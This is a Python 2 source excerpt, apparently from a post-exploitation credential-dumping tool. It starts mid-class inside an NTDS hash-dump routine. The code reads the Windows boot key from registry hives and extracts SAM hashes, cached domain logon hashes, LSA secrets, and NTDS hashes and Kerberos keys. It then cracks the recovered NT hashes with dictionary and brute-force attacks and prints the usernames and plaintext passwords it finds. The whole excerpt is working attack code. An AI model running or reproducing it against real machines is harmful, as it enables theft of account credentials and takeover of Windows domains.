					# logging.error('Error while calling getNextRow(), trying the next one')
					continue 

				if record is None:
					break
				try:
					if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES: 
						self.__decryptHash(record)
						self.__decryptSupplementalInfo(record)
				except Exception, e:
					try:
						# logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
						# logging.error(str(e))
						pass
					except: 
						# logging.error("Error while processing row!")
						# logging.error(str(e))
						pass
		# Now we'll print the Kerberos keys. So we don't mix things up in the output. 
		if len(self.__kerberosKeys) > 0:
			# logging.info('Kerberos keys from %s ' % self.__NTDS)
			for itemKey in self.__kerberosKeys.keys():
				print itemKey
		
		results = {}
		if len(self.__hashesFound) > 0:
			results['ntds'] = self.__hashesFound
		if len(self.__kerberosKeys) > 0:
			results['ntds.kerberos'] = self.__kerberosKeys
		return results

	def finish(self):
		if self.__NTDS is not None:
			self.__ESEDB.close()

class DumpSecrets:
	def __init__(self, address, system=False, security=False, sam=False, ntds=False, history=False):
		self.__remoteAddr = address
		self.__lmhash = ''
		self.__nthash = ''
		self.__SAMHashes = None
		self.__NTDSHashes = None
		self.__LSASecrets = None
		self.__systemHive = system
		self.__securityHive = security
		self.__samHive = sam
		self.__ntdsFile = ntds
		self.__history = history
		self.__noLMHash = True
		self.__isRemote = False
		self.categoryName = ''
		self.wordlist = get_dico() + constant.passwordFound

	def getBootKey(self):
		# Local Version whenever we are given the files directly
		bootKey = ''
		tmpKey = ''
		winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
		# We gotta find out the Current Control Set
		currentControlSet = winreg.getValue('\\Select\\Current')[1]
		currentControlSet = "ControlSet%03d" % currentControlSet
		for key in ['JD','Skew1','GBG','Data']:
			# logging.debug('Retrieving class info for %s'% key)
			try:
				ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
			except:
				print 'failed'
			digit = ans[:16].decode('utf-16le')
			tmpKey = tmpKey + digit
		
		transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

		tmpKey = tmpKey.decode('hex')
		for i in xrange(len(tmpKey)):
			bootKey += tmpKey[transforms[i]]
		
		# logging.info('Target system bootKey: 0x%s' % bootKey.encode('hex'))
		return bootKey

	def checkNoLMHashPolicy(self):
		# logging.debug('Checking NoLMHash Policy')
		winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
		# We gotta find out the Current Control Set
		currentControlSet = winreg.getValue('\\Select\\Current')[1]
		currentControlSet = "ControlSet%03d" % currentControlSet

		noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
		if noLmHash is not None:
			noLmHash = noLmHash[1]
		else:
			noLmHash = 0

		if noLmHash != 1:
			# logging.debug('LMHashes are being stored')
			return False
		# logging.debug('LMHashes are NOT being stored')
		return True
	
	def create_nthash(self, word):
		generated_hash = hashlib.new('md4', word.encode('utf-16le')).digest()
		return binascii.hexlify(generated_hash)
	
	def dictionaryAttack_Hash(self, hash):
		# check using a basic dictionary list and all passwords already found
		for word in self.wordlist:
			try:
				generated_hash = self.create_nthash(word)
				if generated_hash == hash:
					return word
			except:
				pass
		return False
	
	def bruteFortce_hash(self, hash):
		# brute force attack
		charset_list = 'abcdefghijklmnopqrstuvwxyz1234567890!?'
		print_debug('ATTACK', 'Brute force attack !!! (%s characters)' %  str(constant.bruteforce))
		print_debug('DEBUG', 'charset: %s' %  charset_list)

		try:
			for length in range(1, int(constant.bruteforce)+1):
				words = product(charset_list, repeat=length)
				for word in words:
					print_debug('DEBUG', '%s' %  ''.join(word))
					generated_hash = self.create_nthash(''.join(word).strip())
					if generated_hash == hash:
						return ''.join(word)

		except (KeyboardInterrupt, SystemExit):
			print 'INTERRUPTED!'
			print_debug('INFO', 'Dictionnary attack interrupted')
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))

		print_debug('WARNING', 'No password has been found using the brute force attack')
		return False
	
	# used for dictionary attack, if user specify a specific file
	def get_dic(self, dictionary_path):
		words = []
		if dictionary_path:
			try:
				dicFile = open (dictionary_path,'r')
			except Exception,e:
				print_debug('DEBUG', '{0}'.format(e))
				print_debug('ERROR', 'Unable to open passwords file: %s' % str(dictionary_path))
				return []
			
			for word in dicFile.readlines():
				words.append(word.strip('\n'))
			dicFile.close()
		return words
	
	def hashes_to_dic(self, title, format, content):
		Header().title1(title)
		print_debug('INFO', 'Format: (%s)' % format)
		
		items = sorted(content)
		pwdFound = []
		values = {}
		self.wordlist += self.get_dic(constant.path)
		all_hash = '\r\n'
		for item in items:
			hash = content[item]
			(uid, rid, lmhash, nthash) = hash.split(':')[:4]
			# add the user on the list to found weak password (login equal password)
			self.wordlist.append(uid.encode("utf8"))
			all_hash = '%s\r\n%s' % (all_hash, hash)
			password = self.dictionaryAttack_Hash(nthash)
			if not password and constant.bruteforce:
				password = self.bruteFortce_hash(nthash)
			
			# if a password has been found from the dictionary attack
			if password:
				accounts = {}
				accounts['Category'] = 'System account'
				accounts['user'] = uid
				accounts['password'] = password
				pwdFound.append(accounts)
		
		values['hashes'] = all_hash
		pwdFound.append(values)
		return pwdFound
	
	def dump(self):
		try:
			bootKey = self.getBootKey()
			if self.__ntdsFile is not None:
				# Grab configuration about LM Hashes storage
				self.__noLMHash = self.checkNoLMHashPolicy()
			
			# -------------- LM / NTLM HASHES --------------
			SAMFileName = self.__samHive
			self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
			samHashes_tab = self.__SAMHashes.dump()
			if samHashes_tab:
				pwdFound = self.hashes_to_dic('Local SAM hashes', 'uid:rid:lmhash:nthash', samHashes_tab)
				print_output('Local SAM hashes', pwdFound, True)
			
			# -------------- LSA SECRETS --------------
			SECURITYFileName = self.__securityHive
			self.__LSASecrets=LSASecrets(SECURITYFileName, bootKey, isRemote = self.__isRemote)
			
			# --- Cached Hashes ---
			cachedHashes = self.__LSASecrets.dumpCachedHashes()
			if cachedHashes:
				pwdFound = self.hashes_to_dic('Cached domain logon information', 'uid:encryptedHash:longDomain:domain', cachedHashes)
				print_output('Cached domain logon information', pwdFound, True)
			
			# --- LSA Secrets ---
			secrets = self.__LSASecrets.dumpSecrets()
			if secrets:
				Header().title1('LSA Secrets')
				print_output('LSA Secrets', secrets, True)
			
			# -------------- NTDS File --------------
			NTDSFileName = self.__ntdsFile
			self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
			ntdsHashes_dic = self.__NTDSHashes.dump()
			if ntdsHashes_dic:
				Header().title1('NTDS File')
				for nts_keys in ntdsHashes_dic.keys():
					hashesFound = ntdsHashes_dic[nts_keys]
					if nts_keys == 'ntds':
						items = sorted(hashesFound)
						for item in items:
							try:
								hashesFound[item]
							except Exception,e:
								print_debug('DEBUG', '{0}'.format(e))
					elif nts_keys == 'ntds.kerberos':
						for itemKey in hashesFound:
							print itemKey
			
			# cleanup
			self.cleanup()
		except (Exception, KeyboardInterrupt), e:
			# logging.error(e)
			try:
				self.cleanup()
			except:
				pass

	def cleanup(self):
		# logging.info('Cleaning up... ')
		if self.__SAMHashes:
			self.__SAMHashes.finish()
		if self.__LSASecrets:
			self.__LSASecrets.finish()
		if self.__NTDSHashes:
			self.__NTDSHashes.finish()

def retrieve_hash(address, system, security, sam, ntds, history):
	dumper = DumpSecrets(address, system, security, sam, ntds, history)
	try:
		dumper.dump()
	except Exception, e:
		pass

